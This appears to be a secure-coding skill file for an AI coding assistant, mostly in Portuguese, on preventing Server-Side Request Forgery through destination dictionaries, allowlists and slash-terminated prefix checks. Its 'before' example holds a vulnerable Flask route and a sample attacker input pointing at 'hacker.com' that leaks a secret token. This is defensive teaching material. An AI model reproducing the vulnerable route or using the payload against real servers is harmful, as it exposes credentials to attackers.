---
name: rs-seguranca-devs-ssrf
description: "Guards against Server-Side Request Forgery (SSRF) vulnerabilities when writing backend code that makes HTTP requests. Use when user asks to 'fetch a URL', 'call an API', 'make a request from user input', 'consume a webhook', or builds any server-side HTTP request with dynamic parameters. Applies validation hierarchy: avoid dynamic requests, use dictionaries, use whitelists, validate format with slash delimiter. Make sure to use this skill whenever generating code that constructs HTTP requests from user-controlled data. Not for client-side fetch calls, static API integrations, or frontend security."
---

# Server-Side Request Forgery (SSRF)

> Nunca construa requisicoes HTTP server-side com dados do usuario sem validacao — o atacante pode redirecionar requests para servidores maliciosos, vazar tokens e credenciais, ou usar seu servidor como no de ataque DDoS.

## Rules

1. **Evite request dinamico quando possivel** — se o objetivo e incluir conteudo local, use include/import nativo da linguagem, porque `file_get_contents` e `fetch` aceitam URLs remotas silenciosamente
2. **Prefira dicionario de destinos** — mapeie IDs para URLs no backend (`{1: "/page1", 2: "/page2"}`), porque o usuario so envia um numero, nunca uma URL
3. **Use whitelist quando dicionario nao e possivel** — compare o destino contra uma lista fixa de URLs permitidas, porque qualquer URL fora da lista e rejeitada automaticamente
4. **Valide formato sempre ate a primeira barra** — se precisar validar prefixo, valide ate `http://dominio.com/` (com barra final), porque sem a barra o atacante registra `dominio.com.hacker.com` e passa na validacao
5. **Nunca exponha tokens em query strings de requests dinamicos** — tokens concatenados em URLs construidas com input do usuario vazam para qualquer servidor que o atacante controlar

## How to write

### Dicionario de destinos (metodo preferido)

```python
# Mapeie destinos no backend — usuario so envia o ID
PAGES = {
    1: {"name": "Home", "path": "http://localhost/index.php"},
    2: {"name": "Page 1", "path": "http://localhost/page1.php"},
    3: {"name": "Page 2", "path": "http://localhost/page2.php"},
}

@app.route("/analyze")
def analyze():
    page_id = int(request.args.get("page", 0))
    if page_id not in PAGES:
        return "Invalid page", 400
    response = requests.get(PAGES[page_id]["path"] + "?token=" + SECRET_TOKEN)
    return response.text
```

### Validacao de formato (quando inevitavel)

```python
# SEMPRE valide ate a primeira barra apos o dominio
def validate_url(url: str) -> bool:
    allowed_prefixes = [
        "http://localhost/",      # COM barra final
        "https://api.partner.com/",  # COM barra final
    ]
    return any(url.startswith(prefix) for prefix in allowed_prefixes)
```

## Example

**Before (vulneravel a SSRF):**
```python
@app.route("/analyze")
def analyze():
    page = request.args.get("page")  # Usuario controla a URL inteira
    response = requests.get(page + "?token=" + SECRET_TOKEN)
    return response.text
# Atacante envia: ?page=http://hacker.com → token vaza nos logs do hacker
```

**After (com dicionario):**
```python
@app.route("/analyze")
def analyze():
    page_id = int(request.args.get("page", 0))
    if page_id not in PAGES:
        return "Invalid page", 400
    response = requests.get(PAGES[page_id]["path"] + "?token=" + SECRET_TOKEN)
    return response.text
# Atacante envia: ?page=http://hacker.com → erro, so aceita numeros 1, 2, 3
```

## Heuristics

| Situacao | Faca |
|----------|------|
| Incluir conteudo de arquivo local | Use `include`/`import` nativo, nunca `file_get_contents`/`fetch` |
| Consumir API de parceiro com conjunto fixo de endpoints | Dicionario de destinos |
| Webhook com destinos variaveis mas conhecidos | Whitelist de URLs |
| Destino realmente dinamico (raro) | Valide prefixo ate a primeira barra |
| Qualquer request com token/credencial | Nunca concatene token em URL construida com input do usuario |

## Anti-patterns

| Nunca escreva | Escreva em vez disso |
|---------------|----------------------|
| `requests.get(user_input)` | `requests.get(PAGES[user_input]["path"])` |
| `url.startswith("http://localhost")` | `url.startswith("http://localhost/")` (com barra) |
| `fetch(req.query.url + "?token=" + token)` | Dicionario + lookup por ID |
| `file_get_contents($url)` para incluir HTML local | `include($filepath)` com path validado |
| Confiar que validar dominio sem barra e seguro | Validar ate a primeira barra para bloquear subdominio malicioso |

## Deep reference library

- [deep-explanation.md](references/deep-explanation.md) — Raciocínio completo do instrutor, analogias e edge cases
- [code-examples.md](references/code-examples.md) — Todos os exemplos de código expandidos com variações


---

## Deep dive
- [Deep explanation](../../../data/skills/seguranca-para/rs-seguranca-para-devs-server-side-request-forgery-ssrf/references/deep-explanation.md)
- [Code examples](../../../data/skills/seguranca-para/rs-seguranca-para-devs-server-side-request-forgery-ssrf/references/code-examples.md)
